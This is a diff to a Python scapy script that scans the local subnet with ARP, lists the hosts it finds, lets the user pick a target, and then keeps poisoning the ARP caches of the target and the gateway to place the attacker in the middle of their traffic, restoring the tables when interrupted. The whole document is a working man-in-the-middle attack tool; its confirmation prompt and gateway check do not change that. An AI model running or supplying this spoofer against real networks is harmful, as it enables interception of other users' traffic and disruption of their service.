@@ -1,20 +1,65 @@
 import scapy.all as scapy
 import subprocess
+import ipaddress
+import socket
 import time
 import sys
 import re
 
 
-def get_mac(ip):
-	"""Resolve MAC address for an IP and return None if not found."""
+def Ascan(ip_range):
+    arp_request = scapy.ARP(pdst=ip_range)
+
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+
+    arp_request_broadcast = broadcast/arp_request
+
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    clients_list = []
+    for element in answered_list:
+        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        clients_list.append(client_dict)
+    
+    return clients_list
+
+
+def Lget_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        return s.getsockname()[0]
+    except Exception:
+        return None
+    finally:
+        s.close()
+
+
+def Mget_netmask_for_ip(local_ip):
+    if not local_ip:
+        return None
+    try:
+        out = subprocess.check_output(["ipconfig"], text=True, errors="ignore")
+        blocks = re.split(r'\r?\n\r?\n', out)
+        for block in blocks:
+            if local_ip in block:
+                m = re.search(r'Subnet Mask[ .:]*([\d\.]+)', block)
+                if m:
+                    return m.group(1)
+    except Exception:
+        pass
+    return None
+
+
+def Oget_mac(ip):
 	mac = scapy.getmacbyip(ip)
 	if mac is None:
 		print(f"[!] Could not resolve MAC for {ip}. Host may be down or unreachable.")
 	return mac
 
 
-def spoof(target_ip, spoof_ip):
-	target_mac = get_mac(target_ip)
+def Gspoof(target_ip, spoof_ip):
+	target_mac = Oget_mac(target_ip)
 	if not target_mac:
 		return
 	arp = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
@@ -24,8 +69,8 @@ def spoof(target_ip, spoof_ip):
 
 
 def restore(destination_ip, source_ip):
-	destination_mac = get_mac(destination_ip)
-	source_mac = get_mac(source_ip)
+	destination_mac = Oget_mac(destination_ip)
+	source_mac = Oget_mac(source_ip)
 	if not destination_mac or not source_mac:
 		print(f"[!] Cannot restore ARP for {destination_ip} <- {source_ip} due to missing MAC.")
 		return
@@ -58,19 +103,76 @@ def get_default_gateway():
 
 
 interval = 4
-ip_target = input("Enter target IP address: ")
 ip_gateway = get_default_gateway()
+local_ip = Lget_local_ip()
+netmask = Mget_netmask_for_ip(local_ip)
+
+if local_ip and netmask:
+    try:
+        network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
+        ip_range = f"{network.network_address}/{network.prefixlen}"
+    except Exception:
+        ip_range = None
+else:
+    if ip_gateway:
+        parts = ip_gateway.split('.')
+        ip_range = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
+    elif local_ip:
+        parts = local_ip.split('.')
+        ip_range = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
+    else:
+        ip_range = None
+
+print(f"Detected network range: {ip_range} | Default gateway: {ip_gateway}")
+if not ip_range or not ip_gateway:
+	print("Could not determine network range or gateway. Exiting.")
+	sys.exit(1)
+
+print("Scanning the local network for hosts...")
+clients = Ascan(ip_range)
+if not clients:
+	print("No hosts found to target. Exiting.")
+	sys.exit(0)
+
+print("Found hosts:")
+for i, c in enumerate(clients, 1):
+	print(f"{i:3}: {c['ip']:16}  {c['mac']}")
+
+target_ip = input("Enter target IP from the list above (or press Enter to cancel): ").strip()
+if not target_ip:
+	print("No target selected. Exiting.")
+	sys.exit(0)
+
+if not any(c['ip'] == target_ip for c in clients):
+	print("Selected IP not found in the scanned hosts. Exiting.")
+	sys.exit(1)
+
+if target_ip == ip_gateway:
+	print("Target IP is the gateway. Aborting to avoid disrupting the network.")
+	sys.exit(1)
+
+confirm = input(f"Confirm spoofing {target_ip} so it believes the gateway is {ip_gateway}? Type 'yes' to proceed: ")
+if confirm.lower() != 'yes':
+	print("Confirmation not received. Exiting.")
+	sys.exit(0)
 
 try:
-	print(f"Starting ARP spoofing: {ip_target} <-> {ip_gateway} (interval={interval}s)")
+	print(f"Starting ARP spoofing: {target_ip} <-> {ip_gateway} (interval={interval}s)")
 	while True:
-		spoof(ip_target, ip_gateway)
-		spoof(ip_gateway, ip_target)
+		Gspoof(target_ip, ip_gateway)
+		Gspoof(ip_gateway, target_ip)
 		time.sleep(interval)
-		
+
 except KeyboardInterrupt:
 	print('\nInterrupted by user. Restoring ARP tables...')
-	restore(ip_gateway, ip_target)
-	restore(ip_target, ip_gateway)
+	restore(ip_gateway, target_ip)
+	restore(target_ip, ip_gateway)
 	print('Restore completed. Exiting.')
 	sys.exit(0)
+
+except Exception as e:
+	print(f"Runtime error: {e}")
+	print('Attempting to restore ARP tables...')
+	restore(ip_gateway, target_ip)
+	restore(target_ip, ip_gateway)
+	sys.exit(1)
